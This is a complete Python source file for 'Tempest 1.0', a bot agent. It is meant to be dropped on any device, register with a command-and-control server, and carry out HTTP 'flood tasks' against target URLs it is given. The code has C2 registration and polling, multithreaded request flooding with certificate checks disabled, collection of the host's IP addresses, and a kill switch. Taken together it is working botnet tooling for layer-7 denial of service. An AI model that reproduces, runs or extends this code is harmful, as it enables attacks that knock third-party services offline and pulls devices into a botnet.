#!/usr/bin/env python3
"""
Tempest 1.0 — Bot Agent
================================
C2: __C2_HOST__:__C2_PORT__

Drop this file on any device and run:  python3 agent.py
It will self-register with the C2 server and await flood tasks.

Pure stdlib — no pip required.  Works on Windows, macOS, Linux.

Exposes Prometheus metrics at http://0.0.0.0:9100/metrics
"""

import os
import sys
import uuid
import json
import time
import socket
import platform
import threading
import ssl
import urllib.request
import urllib.error
import concurrent.futures
from http.server import HTTPServer, BaseHTTPRequestHandler

# ── Baked-in C2 config ────────────────────────────────────────────────────────
C2_HOST = "__C2_HOST__"
C2_PORT = int("__C2_PORT__")
C2_BASE = "http://{}:{}".format(C2_HOST, C2_PORT)
METRICS_PORT = 9100

# ── Single-instance lock (prevents duplicate agents on same device) ───────────
_AGENT_BASE = os.path.dirname(os.path.abspath(__file__))
PID_FILE  = os.path.join(_AGENT_BASE, "agent.pid")

def _enforce_single_instance():
    """Kill any other running agent.py process, then write our own PID."""
    my_pid = os.getpid()
    # Check existing PID file
    if os.path.isfile(PID_FILE):
        try:
            old_pid = int(open(PID_FILE).read().strip())
            if old_pid != my_pid:
                try:
                    import signal as _sig
                    os.kill(old_pid, _sig.SIGTERM)
                    time.sleep(1)
                    try: os.kill(old_pid, _sig.SIGKILL)
                    except OSError: pass
                    print("[agent] Killed duplicate instance (PID {})".format(old_pid))
                except OSError:
                    pass  # process already dead
        except (ValueError, OSError):
            pass
    # Write our PID
    try:
        with open(PID_FILE, "w") as f:
            f.write(str(my_pid))
    except Exception:
        pass

# ── Agent identity (persistent across restarts via local file) ─────────────────
ID_FILE = os.path.join(_AGENT_BASE, ".agent_id")

def _load_or_create_id():
    if os.path.isfile(ID_FILE):
        try:
            return open(ID_FILE).read().strip()
        except Exception:
            pass
    aid = "agent-" + str(uuid.uuid4())[:8]
    try:
        with open(ID_FILE, "w") as f:
            f.write(aid)
    except Exception:
        pass
    return aid

AGENT_ID  = _load_or_create_id()
HOSTNAME  = socket.gethostname()
PLATFORM  = platform.system() + " " + platform.release()

def _get_real_ip():
    """Get the real outbound private IP (avoids 127.0.1.1 loopback alias on Linux)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((C2_HOST, C2_PORT))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        try:
            return socket.gethostbyname(HOSTNAME)
        except Exception:
            return "0.0.0.0"

def _get_public_ip():
    """Fetch public IP from multiple lookup services (first success wins)."""
    services = [
        "https://api.ipify.org",
        "https://ifconfig.me/ip",
        "https://icanhazip.com",
        "https://checkip.amazonaws.com",
    ]
    for url in services:
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "curl/7.0"})
            with urllib.request.urlopen(req, timeout=5) as r:
                ip = r.read().decode().strip()
                if ip and len(ip) < 46:  # sanity check (max IPv6 length)
                    return ip
        except Exception:
            continue
    return ""

# ── Live metrics (updated in real-time during flood) ─────────────────────────
_metrics_lock = threading.Lock()
_metrics = {
    "requests_total":   0,
    "requests_success": 0,
    "requests_errors":  0,
    "rps_current":      0.0,
    "latency_p50_ms":   0.0,
    "latency_p99_ms":   0.0,
    "flood_active":     0,       # 1 = running, 0 = idle
    "flood_target":     "",
    "flood_method":     "",
    "last_task_id":     "",
}
_latencies = []   # rolling window for percentile calc

def _update_metrics(**kwargs):
    with _metrics_lock:
        _metrics.update(kwargs)

def _record_request(ok, ms):
    with _metrics_lock:
        _metrics["requests_total"]   += 1
        if ok: _metrics["requests_success"] += 1
        else:  _metrics["requests_errors"]  += 1
        if ms > 0:
            _latencies.append(ms)
            if len(_latencies) > 10000:
                _latencies.pop(0)
            s = sorted(_latencies)
            n = len(s)
            _metrics["latency_p50_ms"] = round(s[int(n*0.50)], 1)
            _metrics["latency_p99_ms"] = round(s[int(n*0.99)], 1)

# ── Prometheus text-format renderer ──────────────────────────────────────────
def _render_prometheus():
    with _metrics_lock:
        m = dict(_metrics)
    labels = 'agent_id="{aid}",hostname="{h}",platform="{p}"'.format(
        aid=AGENT_ID, h=HOSTNAME, p=PLATFORM.replace('"', "'"))
    lines = [
        "# HELP l7_requests_total Total HTTP requests sent during flood",
        "# TYPE l7_requests_total counter",
        "l7_requests_total{{{l}}} {v}".format(l=labels, v=m["requests_total"]),

        "# HELP l7_requests_success Requests that received an HTTP response",
        "# TYPE l7_requests_success counter",
        "l7_requests_success{{{l}}} {v}".format(l=labels, v=m["requests_success"]),

        "# HELP l7_requests_errors Requests that failed (connection/timeout)",
        "# TYPE l7_requests_errors counter",
        "l7_requests_errors{{{l}}} {v}".format(l=labels, v=m["requests_errors"]),

        "# HELP l7_rps_current Current requests per second",
        "# TYPE l7_rps_current gauge",
        "l7_rps_current{{{l}}} {v}".format(l=labels, v=round(m["rps_current"], 2)),

        "# HELP l7_latency_p50_ms 50th percentile request latency in milliseconds",
        "# TYPE l7_latency_p50_ms gauge",
        "l7_latency_p50_ms{{{l}}} {v}".format(l=labels, v=m["latency_p50_ms"]),

        "# HELP l7_latency_p99_ms 99th percentile request latency in milliseconds",
        "# TYPE l7_latency_p99_ms gauge",
        "l7_latency_p99_ms{{{l}}} {v}".format(l=labels, v=m["latency_p99_ms"]),

        "# HELP l7_flood_active 1 if a flood is currently running",
        "# TYPE l7_flood_active gauge",
        "l7_flood_active{{{l}}} {v}".format(l=labels, v=m["flood_active"]),
    ]
    return "\n".join(lines) + "\n"

# ── Tiny Prometheus HTTP server ───────────────────────────────────────────────
class _MetricsHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):  # noqa: A002  suppress access logs
        pass
    def do_GET(self):
        if self.path in ("/metrics", "/metrics/"):
            body = _render_prometheus().encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/plain; version=0.0.4; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({
                "agent_id": AGENT_ID, "hostname": HOSTNAME,
                "platform": PLATFORM, "metrics_url": "/metrics"
            }).encode())

def _start_metrics_server():
    for port in range(METRICS_PORT, METRICS_PORT + 10):
        try:
            srv = HTTPServer(("0.0.0.0", port), _MetricsHandler)
            t   = threading.Thread(target=srv.serve_forever, daemon=True)
            t.start()
            print("[agent] Prometheus metrics: http://0.0.0.0:{}/metrics".format(port))
            return port
        except OSError:
            continue
    print("[agent] Warning: could not bind metrics server (ports {}-{} busy)".format(
        METRICS_PORT, METRICS_PORT+9))
    return None

# ── Flood state ───────────────────────────────────────────────────────────────
_STOP  = threading.Event()
_BUSY  = threading.Event()   # set while a flood is running

# ── Helpers ───────────────────────────────────────────────────────────────────
def _post(path, data):
    body = json.dumps(data).encode()
    req  = urllib.request.Request(
        C2_BASE + path, data=body,
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return json.loads(r.read())
    except Exception as e:
        return {"ok": False, "error": str(e)}

def _get(path):
    try:
        req = urllib.request.Request(C2_BASE + path)
        with urllib.request.urlopen(req, timeout=10) as r:
            return json.loads(r.read())
    except Exception as e:
        return {"ok": False, "error": str(e)}

# ── Single HTTP request (no proxy — agent sends directly) ─────────────────────
def _fire(target_url, method, idx):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    t0 = time.time()
    try:
        body_data = None
        if method in ("POST", "PUT", "PATCH"):
            body_data = json.dumps({"probe": "l7_agent", "idx": idx}).encode()
        req = urllib.request.Request(target_url, data=body_data, method=method)
        if body_data:
            req.add_header("Content-Type", "application/json")
        handler = urllib.request.HTTPSHandler(context=ctx)
        opener  = urllib.request.build_opener(handler)
        with opener.open(req, timeout=10) as r:
            r.read()
            status = r.status
        return True, (time.time()-t0)*1000, status
    except urllib.error.HTTPError as e:
        return False, (time.time()-t0)*1000, e.code
    except Exception:
        return False, 0.0, 0

# ── Flood executor ────────────────────────────────────────────────────────────
def _run_flood(task):
    global _latencies
    _BUSY.set()
    _STOP.clear()

    target   = task.get("target", "")
    method   = task.get("method", "GET").upper()
    workers  = max(1, int(task.get("workers", 20)))
    rps      = max(0.1, float(task.get("rps", 50)))
    duration = max(1.0, float(task.get("duration", 30)))
    task_id  = task.get("task_id", "unknown")

    # Reset metrics for this run
    with _metrics_lock:
        _metrics["requests_total"]   = 0
        _metrics["requests_success"] = 0
        _metrics["requests_errors"]  = 0
        _metrics["rps_current"]      = 0.0
        _metrics["latency_p50_ms"]   = 0.0
        _metrics["latency_p99_ms"]   = 0.0
        _metrics["flood_active"]     = 1
        _metrics["flood_target"]     = target
        _metrics["flood_method"]     = method
        _metrics["last_task_id"]     = task_id
        _latencies = []

    total = [0]; success = [0]; errors = [0]
    lock  = threading.Lock()
    interval   = 1.0 / rps if rps > 0 else 0.0
    wall_start = time.time()
    deadline   = wall_start + duration

    # RPS ticker: update rps_current every second
    _rps_stop = threading.Event()
    def _rps_ticker():
        prev = 0
        while not _rps_stop.is_set():
            time.sleep(1)
            with lock:
                cur = total[0]
            _update_metrics(rps_current=round(cur - prev, 1))
            prev = cur
    threading.Thread(target=_rps_ticker, daemon=True).start()

    def _worker(idx):
        ok, ms, status = _fire(target, method, idx)
        with lock:
            total[0]   += 1
            if ok: success[0] += 1
            else:  errors[0]  += 1
        _record_request(ok, ms)

    idx = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as pool:
        futs = []
        while time.time() < deadline and not _STOP.is_set():
            t0 = time.time()
            futs.append(pool.submit(_worker, idx))
            idx += 1
            futs = [f for f in futs if not f.done()]
            sl = interval - (time.time()-t0)
            if sl > 0:
                time.sleep(sl)
        for f in futs:
            try: f.result(timeout=15)
            except Exception: pass

    _rps_stop.set()
    wall = time.time() - wall_start
    rps_actual = round(total[0]/wall, 1) if wall > 0 else 0

    _update_metrics(flood_active=0, rps_current=0.0)

    # Report result to C2
    _post("/api/agent/result", {
        "agent_id":      AGENT_ID,
        "task_id":       task_id,
        "total":         total[0],
        "success":       success[0],
        "errors":        errors[0],
        "rps_actual":    rps_actual,
        "wall":          round(wall, 2),
        "latency_p50":   _metrics["latency_p50_ms"],
        "latency_p99":   _metrics["latency_p99_ms"],
        "metrics_port":  METRICS_PORT,
    })
    print("[agent] Task {} done: {} sent, {} rps".format(task_id, total[0], rps_actual))
    _BUSY.clear()

# ── Main loop ─────────────────────────────────────────────────────────────────
def main():
    # Enforce single instance — kill any duplicate and write our PID
    _enforce_single_instance()
    print("[agent] ID: {}  C2: {}:{}".format(AGENT_ID, C2_HOST, C2_PORT))

    # Start Prometheus metrics server
    metrics_port = _start_metrics_server()

    # Fetch public IP once at startup (non-blocking, best-effort)
    public_ip = _get_public_ip()
    if public_ip:
        print("[agent] Public IP: {}".format(public_ip))

    # Register with C2
    while True:
        r = _post("/api/agent/register", {
            "id":           AGENT_ID,
            "hostname":     HOSTNAME,
            "platform":     PLATFORM,
            "ip":           _get_real_ip(),
            "public_ip":    public_ip,
            "metrics_port": metrics_port or 0,
        })
        if r.get("ok"):
            print("[agent] Registered with C2")
            break
        print("[agent] Registration failed: {} — retrying in 5s".format(r.get("error","")))
        time.sleep(5)

    # Poll loop
    while True:
        try:
            # Heartbeat + send live metrics snapshot
            with _metrics_lock:
                snap = dict(_metrics)
            ping_resp = _post("/api/agent/ping", {
                "id":      AGENT_ID,
                "metrics": snap,
            })

            # Server restarted and lost state — re-register immediately
            if ping_resp.get("reregister"):
                print("[agent] C2 lost state (restarted?) — re-registering...")
                r = _post("/api/agent/register", {
                    "id":           AGENT_ID,
                    "hostname":     HOSTNAME,
                    "platform":     PLATFORM,
                    "ip":           _get_real_ip(),
                    "metrics_port": METRICS_PORT,
                })
                if r.get("ok"):
                    print("[agent] Re-registered with C2")
                continue  # skip task poll this cycle

            # Kill switch: C2 can signal stop via ping response (works even while busy)
            if ping_resp.get("stop") and _BUSY.is_set():
                _STOP.set()
                print("[agent] Kill switch received via ping — stopping flood")

            # Poll for task only if not busy
            if not _BUSY.is_set():
                r = _get("/api/agent/task?id=" + AGENT_ID)
                if r.get("task"):
                    task = r["task"]
                    print("[agent] Received task: {}".format(task.get("task_id")))
                    t = threading.Thread(target=_run_flood, args=(task,), daemon=True)
                    t.start()
                elif r.get("stop"):
                    _STOP.set()
                    print("[agent] Stop signal received (idle)")

        except Exception as exc:
            print("[agent] Poll error: {}".format(exc))

        time.sleep(5)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[agent] Stopped.")
